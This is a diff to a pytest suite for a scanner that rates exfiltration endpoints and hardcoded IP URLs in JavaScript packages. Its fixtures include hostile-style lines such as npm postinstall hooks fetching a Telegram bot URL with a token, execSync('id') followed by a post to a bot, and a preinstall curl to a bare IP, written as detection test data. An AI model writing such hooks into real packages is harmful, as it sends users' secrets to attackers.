@@ -425,6 +425,9 @@ _UUID = "0b1c2d3e-77bf-4ccb-8ba0-e5a652841e0a"
         ("server: { allowedHosts: ['.ngrok-free.app'] }", "no tunnel's name"),
         (" * a random https://….trycloudflare.com address, no account needed", "placeholder host"),
         ("log('no URL (api.trycloudflare.com reachable?)')", "quick tunnel's name"),
+        # round 7 (X4): the API's prefix as a constant, the token joined to it later
+        ("const MODULE='tg',BASE_URL='https://api.telegram.org/bot',POLL_TIMEOUT_S=0x1e;", "bot."),
+        ('const PREFIX = "https://api.telegram.org/bot";\nget(PREFIX + token)', "own bot."),
     ],
 )
 def test_what_names_no_endpoint_in_a_quiet_file_is_low(text: str, note: str) -> None:
@@ -455,6 +458,9 @@ def test_what_names_no_endpoint_in_a_quiet_file_is_low(text: str, note: str) -> 
         'curl -s "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage" -d text=hi',
         # an install hook's line
         '  "postinstall": "node -e \\"fetch(\'https://api.telegram.org/bot\'+t)\\""',
+        # round 7 (X4): a constant prefix in a file that collects, or on a hook's line
+        "const BASE = 'https://api.telegram.org/bot'; execSync('id'); post(BASE + T, o)",
+        '  "postinstall": "node -e \\"u=\'https://api.telegram.org/bot\';get(u+t)\\""',
         # a webhook.site bin id near the host, or a custom subdomain
         f"const options = {{ hostname: 'webhook.site', path: '/{_UUID}', method: 'POST' }};",
         f"fetch('https://webhook.site/{_UUID}', {{ method: 'POST', body }})",
@@ -1070,6 +1076,10 @@ def test_a_tunnel_in_a_json_catalog_is_low() -> None:
     [
         "get('http://45.33.32.156:8080/p')",
         "const C2 = 'http://45.33.32.156'; fetch(process.env.X || C2)",
+        # a `default:` key that declares no option, a URL handed to a call inside an example
+        "const pick = { default: 'http://45.33.32.156' }; get(pick.default)",
+        'const example = { u: "http://45.33.32.156" }; fetch(example.u)',
+        'examples: { run: get("http://45.33.32.156/x") }',
         '  "preinstall": "curl ${U:-http://45.33.32.156/x}"',
         "const hosts = ['http://45.33.32.156', 'http://1.92.103.192']; for (h of hosts) get(h)",
         "lib = require(('http://100.24.177.136/cb'.indexOf('https:') === 0) ? 'https' : 'http')",
@@ -1077,3 +1087,60 @@ def test_a_tunnel_in_a_json_catalog_is_low() -> None:
 )
 def test_an_ip_url_that_is_used_stays_medium(text: str) -> None:
     assert ("medium", 3.0) in _ips(text)
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "{ displayName: 'B46 URL', name: 'b46Url', type: 'string',"
+        " default: 'http://114.114.114.46:8000', required: true },",
+        'inputs: [\n  {\n    name: "bugUrl",\n    label: "Bug link",\n'
+        '    default: "http://121.40.16.93:8090/bug-view-.html"\n  },',
+        '{"type": "string", "default": "http://45.33.32.156:80", "description": "API base"}',
+        "baseUrl: z.string().url().default('http://45.33.32.156:8080'),",
+    ],
+)
+def test_an_ip_url_as_a_declared_option_s_default_is_low(text: str) -> None:
+    """`hardcoded-ip` v8 (round 7, X2)."""
+    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.hardcoded-ip"]
+    assert [(m.severity.value, m.weight) for m in matches] == [("low", 1.0)]
+    assert "default value of a declared option" in matches[0].explanation
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        "showSumoFromFile: {\n  schema: q,\n  example: {\n"
+        '    server: "http://116.196.98.229:8000/api/import/netxml",\n'
+        "    options: { needZoom: !0 }\n  }\n},",
+        'f:{schema:i,example:{server:"http://116.196.98.229:8000/api/import/netxml",file:"x"}}',
+        "examples: [\n  ['https://web.example.org/', 'a'],\n"
+        "  ['http://114.114.114.39:80/', 'b'],\n]",
+    ],
+)
+def test_an_ip_url_inside_an_example_is_low(text: str) -> None:
+    """`hardcoded-ip` v8 (round 7, X3)."""
+    matches = [m for m in analyse(text.encode()) if m.rule_id == "static.hardcoded-ip"]
+    assert [(m.severity.value, m.weight) for m in matches] == [("low", 1.0)]
+    assert "`example` / `examples` field" in matches[0].explanation
+
+
+def test_an_endpoint_inside_an_api_document_s_example_is_low() -> None:
+    """`exfil-endpoint` v11 (round 7, X3): an OpenAPI example's escaped JSON payload."""
+    text = (
+        '"examples":{"Example 1":{"value":{"list":[{"notifications":"{\\"type\\":\\"URL'
+        f'\\",\\"payload\\":{{\\"path\\":\\"https://webhook.site/{_UUID}\\"}}}}"}}]}}}}}}'
+    )
+    assert _exfil(text) == [("low", 1.0)]
+    assert _exfil(f"post('https://webhook.site/{_UUID}', {{ example: 1 }})") == [("high", 5.0)]
+
+
+def test_an_ip_url_in_a_set_only_asked_has_is_low() -> None:
+    """`hardcoded-ip` v8 (round 7, X5): P5's searched array, written as a `Set`."""
+    legacy = (
+        'var LEGACY_URLS = /* @__PURE__ */ new Set([\n  "http://103.217.185.141:8099/mcp"\n]);\n'
+    )
+    assert _ips(legacy + "if (LEGACY_URLS.has(raw)) raw = TRUSTED;") == [("low", 1.0)]
+    assert _ips(legacy + "for (const u of LEGACY_URLS) get(u);") == [("medium", 3.0)]
+    assert _ips(legacy + "LEGACY_URLS.has(raw); [...LEGACY_URLS].map(get)") == [("medium", 3.0)]
+    assert _ips(legacy) == [("medium", 3.0)]  # never asked
